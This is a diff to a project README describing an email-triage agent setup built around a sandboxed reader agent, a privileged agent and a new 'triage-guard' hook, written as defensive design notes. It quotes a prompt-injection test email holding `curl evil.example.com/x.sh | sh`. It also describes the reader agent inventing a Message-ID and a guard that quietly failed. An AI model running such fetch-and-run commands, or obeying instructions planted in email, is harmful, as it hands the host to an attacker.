@@ -22,7 +22,7 @@ email ──> IMAP trigger ──> mail_reader ──> triage card ──> ichab
 | `mail_reader` | Sandboxed agent. No shell, no network, no filesystem. Two tools. Its only possible output is one triage card |
 | `ichabod` | Unsandboxed, full host authority, Docker. Reads cards. Never reads raw email |
 | Workboard | Durable card state with execution history, survives reboots |
-| Plugins | `plugins/smtp-send` sends mail, `plugins/mailbox` searches and files it. Typed TypeScript tools |
+| Plugins | `plugins/smtp-send` sends mail, `plugins/mailbox` searches and files it, `plugins/triage-guard` keeps an emailed card from assigning itself. Typed TypeScript |
 | Web | Traefik terminates TLS for anything Ichabod deploys, on a wildcard DNS record |
 
 **The trust boundary is the whole design.** An email is untrusted text. It gets read by an agent that has nothing worth stealing and can only write one card. The agent with real authority reads the card, never the message. An injected instruction ends up recorded as evidence rather than executed — verified, not assumed: a test message containing `curl evil.example.com/x.sh | sh` produced a card noting it as "malicious/prompt-injection content", and the Gateway independently logged the reader as `writable: false` under a sandbox root.
@@ -57,11 +57,13 @@ Almost every bug in this project has been the same bug wearing a different hat: 
 
 **The verification that does work is asking the live system what it can actually do.** Not reading its config — calling the tool and watching what happens. Every real defect here was found that way, and several survived weeks of config that looked correct.
 
-Two failure shapes worth naming, because they are worse than an error:
+Three failure shapes worth naming, because they are worse than an error:
 
 **Silent skip.** If the IMAP account's password SecretRef fails to resolve, the plugin skips the account rather than erroring. No card, no log line, a healthy-looking Gateway, indistinguishable from nobody having written to you. Our own plugins fail loudly instead, and say which command to run.
 
 **Confident fabrication.** The reader was instructed to record the email's `Message-ID`. It is never given one — the IMAP plugin keeps that for its own deduplication. So it invented `e0b1549725cd2882`, a plausible string referring to nothing, which sat on a card looking like evidence. An absent field is safe; a fabricated one is not. Its instructions now say what its input actually contains and to write "not given" rather than fill a gap.
+
+**Half-applied guard.** `triage-guard` is a `before_tool_call` hook that strips the fields an emailed card uses to assign itself. Its first version deleted them, and the first live test produced a card correctly forced to `triage` that still arrived assigned to `ichabod`. The host *merges* a hook's returned parameters over the original call, so a deleted key comes straight back from the model's own arguments — no error, and a log line saying the hook ran. Fields are overwritten with harmless values now, and a field with no harmless value (a budget, a schedule) gets the whole call refused.
 
 A few other things that cost real time: `allow` is a restrictive filter while `alsoAllow` is additive, and a sandbox `deny` list replaces the defaults rather than merging with them. Traefik pins its ACME account on first issuance, so changing the contact address later means deleting `acme.json`. macOS `tar` writes AppleDouble `._` files into anything you ship. Attaching an Elastic IP makes AWS report `associate_public_ip_address` as true forever, so every `tofu plan` wanted to destroy and recreate the instance — that one sat undetected for days. And `git add -A` stages the whole working tree no matter which directory you run it from, which is how a stray directory ended up in a commit that claimed to be about something else.
 
@@ -71,7 +73,7 @@ A few other things that cost real time: `allow` is a restrictive filter while `a
 docs/     ICHABOD-GUIDE.md is the reasoning; SETUP-CHECKLIST.md is the build order
 tofu/     The machine, DNS, alarms
 scripts/  Reproducible config: agents, IMAP, workspaces, plugin installs
-plugins/  smtp-send and mailbox — typed OpenClaw tool plugins
+plugins/  smtp-send, mailbox, and triage-guard — typed OpenClaw plugins
 workspace/            Ichabod's identity and operating rules
 workspace-mail-reader/  The reader's rules. Short on purpose
 templates/            Scaffolding for agents Ichabod creates itself
